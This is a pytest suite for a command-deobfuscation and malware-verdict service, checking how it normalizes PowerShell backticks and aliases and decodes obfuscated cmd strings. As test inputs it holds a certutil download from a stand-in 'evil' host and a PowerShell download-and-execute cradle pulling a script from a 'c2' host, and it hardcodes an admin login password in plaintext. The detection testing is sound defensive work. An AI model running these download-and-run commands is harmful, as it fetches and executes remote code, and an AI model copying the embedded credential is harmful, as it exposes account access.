"""Iteration-27 RC4.5 P0+P1 completion-gate re-verification (6 items)."""
import os, json, requests, pytest

BASE_URL = os.environ.get('REACT_APP_BACKEND_URL', '').rstrip('/')
if not BASE_URL:
    with open('/app/frontend/.env') as f:
        for line in f:
            if line.startswith('REACT_APP_BACKEND_URL='):
                BASE_URL = line.split('=', 1)[1].strip().rstrip('/')

SMART = f"{BASE_URL}/api/decode/smart"
ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="module")
def headers():
    last = None
    for _ in range(5):
        r = requests.post(f"{BASE_URL}/api/auth/login",
                          json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=90)
        last = r
        if r.status_code == 200:
            break
    assert last.status_code == 200, f"login failed: {last.status_code} {last.text[:300]}"
    tok = last.json()["access_token"]
    return {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}


def _post(headers, payload):
    last = None
    for _ in range(3):
        r = requests.post(SMART, json=payload, headers=headers, timeout=120)
        last = r
        if r.status_code == 200:
            return r.json()
    assert last.status_code == 200, f"HTTP {last.status_code}: {last.text[:400]}"
    return last.json()


def test_p1_feat9_line_continuation_backtick(headers):
    data = _post(headers, {"input": "powershell `\n  -NoProfile `\n  -Command 'x'"})
    recipe = json.dumps(data.get("recipe", []))
    output_raw = data.get("output_raw", "")
    assert "powershell-backtick-normalize" in recipe, f"recipe missing hook: {recipe}"
    assert "POWERSHELL BACKTICK NORMALIZATION (RC4.5" in output_raw, f"missing header in output_raw"
    assert "line continuation" in output_raw, "missing 'line continuation' substring"
    # verify the reconstructed command has no bare `\n
    # find the reconstructed line
    assert "`\n" not in output_raw.split("POWERSHELL BACKTICK NORMALIZATION")[1][:2000], \
        "bare `\\n found after normalization"


def test_p0_feat6_lolbin_certutil(headers):
    data = _post(headers, {"input": "cmd /c certutil.exe -urlcache -f http://evil/x.exe C:\\a.exe"})
    crr = data.get("cmd_runtime_reconstruct", {})
    verdict = crr.get("verdict", {})
    assert verdict.get("verdict") == "malicious", f"verdict: {verdict}"
    assert verdict.get("category") == "lolbin-execution", f"category: {verdict}"
    mitre = data.get("mitre", [])
    ids = [m.get("id") if isinstance(m, dict) else m for m in mitre]
    assert "T1218" in ids, f"T1218 missing in mitre: {ids}"


def test_p1_feat10_alias_normalize(headers):
    data = _post(headers, {"input": "powershell -NoProfile -Command \"iex (iwr 'http://c2/s.ps1')\""})
    recipe = json.dumps(data.get("recipe", []))
    output_raw = data.get("output_raw", "")
    assert "powershell-alias-normalize" in recipe, f"recipe missing hook: {recipe}"
    assert "POWERSHELL ALIAS NORMALIZATION (RC4.5" in output_raw, "missing alias header"
    assert "Invoke-Expression (Invoke-WebRequest" in output_raw, "alias expansion missing"


def test_p0_feat5_calc_envvar_substring(headers):
    data = _post(headers, {"input": "cmd.exe /c %SystemRoot:~0,1%%ProgramFiles:~8,1%%PUBLIC:~-3,1%%SystemRoot:~0,1%.exe"})
    crr = data.get("cmd_runtime_reconstruct", {})
    assert crr.get("expected_child") == "calc.exe", f"expected_child: {crr.get('expected_child')}"
    assert crr.get("verdict", {}).get("verdict") == "benign-demonstration", f"verdict: {crr.get('verdict')}"
    ct = crr.get("character_trace", [])
    assert len(ct) == 4, f"character_trace length: {len(ct)}"


def test_p0_reg_base64_hello(headers):
    data = _post(headers, {"input": "SGVsbG8gV29ybGQh"})
    assert "Hello World!" in data.get("output_raw", ""), f"missing Hello World!"


def test_p0_reg_operations_list(headers):
    for _ in range(3):
        r = requests.get(f"{BASE_URL}/api/operations", headers=headers, timeout=30)
        if r.status_code == 200:
            break
    assert r.status_code == 200, f"HTTP {r.status_code}"
    ops = r.json()
    names = set()
    if isinstance(ops, list):
        for o in ops:
            if isinstance(o, dict):
                names.add(o.get("id") or o.get("name"))
            else:
                names.add(o)
    elif isinstance(ops, dict):
        names = set(ops.keys())
        for v in ops.values():
            if isinstance(v, list):
                for o in v:
                    if isinstance(o, dict):
                        names.add(o.get("name") or o.get("id"))
                    else:
                        names.add(o)
    required = {"cmd-runtime-reconstruct", "powershell-backtick-normalize",
                "powershell-alias-normalize", "powershell-normalize",
                "batch-envvar-substitute", "cmd-envvar-substring-picker"}
    missing = required - names
    assert not missing, f"missing ops: {missing}; sample names: {list(names)[:20]}"
